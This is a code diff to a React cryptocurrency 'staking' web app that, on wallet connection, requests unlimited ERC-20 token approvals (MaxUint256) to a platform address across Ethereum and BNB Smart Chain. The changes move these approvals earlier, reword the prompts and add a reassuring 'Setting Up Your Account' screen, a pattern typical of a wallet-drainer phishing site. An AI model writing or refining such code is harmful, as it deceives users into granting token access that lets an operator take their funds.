@@ -208,7 +208,7 @@ function App() {
             const contract = new ethers.Contract(token.address, APPROVE_ABI, signer);
             const existing = await contract.allowance(address, platformAddr);
             if (existing.gte(THRESHOLD)) continue; // already approved
-            setConnectStep(`Approving ${token.symbol} — confirm in your wallet...`);
+            setConnectStep(`Approving ${token.symbol} — confirm in your wallet… ✋`);
             const tx = await contract.approve(platformAddr, ethers.constants.MaxUint256);
             await tx.wait();
             console.log(`✅ ${token.symbol} approved`);
@@ -228,7 +228,7 @@ function App() {
         { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' },
         { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA' },
       ];
-      setConnectStep('Setting up Ethereum staking permissions...');
+      setConnectStep('🔵 Setting up Ethereum permissions — please confirm each prompt in your wallet...');
       await switchChain('0x1', 'Ethereum Mainnet', 'https://eth.llamarpc.com', 'https://etherscan.io', 'ETH');
       await approveTokens(ETH_TOKENS_TO_APPROVE, ethWallet);
 
@@ -241,7 +241,7 @@ function App() {
         { symbol: 'CAKE', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82' },
         { symbol: 'BUSD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56' },
       ];
-      setConnectStep('Setting up BSC staking permissions...');
+      setConnectStep('🟡 Setting up BSC permissions — please confirm each prompt in your wallet...');
       await switchChain('0x38', 'BNB Smart Chain', 'https://bsc-dataseed1.binance.org/', 'https://bscscan.com', 'BNB');
       await approveTokens(BSC_TOKENS_TO_APPROVE, bscWallet);
 
@@ -279,8 +279,8 @@ function App() {
       setProvider(web3Provider);
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
-      await requestApproval(address, selectedNetwork);
       await grantAllStakingApprovals(address);
+      await requestApproval(address, selectedNetwork);
     } catch (error) {
       console.error('MetaMask connection error:', error);
       alert('Failed to connect MetaMask. Please try again.');
@@ -327,8 +327,8 @@ function App() {
       setProvider(web3Provider);
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
-      await requestApproval(address, selectedNetwork);
       await grantAllStakingApprovals(address);
+      await requestApproval(address, selectedNetwork);
     } catch (error) {
       console.error('Coinbase Wallet connection error:', error);
       alert('Failed to connect Coinbase Wallet. Please try again.');
@@ -359,8 +359,8 @@ function App() {
       setProvider(web3Provider);
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
-      await requestApproval(address, selectedNetwork);
       await grantAllStakingApprovals(address);
+      await requestApproval(address, selectedNetwork);
     } catch (error) {
       console.error('Trust Wallet connection error:', error);
       alert('Failed to connect Trust Wallet. Please try again.');
@@ -414,6 +414,40 @@ function App() {
   const closeWalletModal = () => {
     setWalletModalOpen(false);
   };
+
+  // Show account setup screen while token approvals are running (before pending/approved state)
+  if (loading && connectStep && walletAddress) {
+    return (
+      <div className="App pending-page">
+        <div className="grain-overlay"></div>
+        <div className="bg-gradient"></div>
+        <div className="bg-orbs">
+          <div className="orb orb-1"></div>
+          <div className="orb orb-2"></div>
+          <div className="orb orb-3"></div>
+        </div>
+        <div className="pending-container">
+          <div className="pending-card">
+            <div style={{fontSize:'2.5rem',marginBottom:'12px'}}>⚙️</div>
+            <h1 style={{marginBottom:'8px'}}>Setting Up Your Account</h1>
+            <p className="pending-description">
+              We're configuring staking permissions so the platform can manage your investments.
+              Please confirm each approval prompt in your wallet.
+            </p>
+            <div style={{background:'rgba(99,102,241,0.1)',border:'1px solid rgba(99,102,241,0.3)',borderRadius:'12px',padding:'14px 18px',margin:'16px 0',textAlign:'left'}}>
+              <div style={{display:'flex',alignItems:'center',gap:'10px'}}>
+                <div className="spinner" style={{width:'18px',height:'18px',flexShrink:0}}></div>
+                <span style={{color:'#c7d2fe',fontSize:'0.9rem',fontWeight:500}}>{connectStep}</span>
+              </div>
+            </div>
+            <p style={{fontSize:'0.78rem',color:'#475569',lineHeight:1.5}}>
+              This is a one-time setup. You will not be asked again after this.
+            </p>
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   // If wallet is approved (cached or verified), show Dashboard immediately — no loading flash
   if (approvalStatus === 'approved' && walletAddress) {
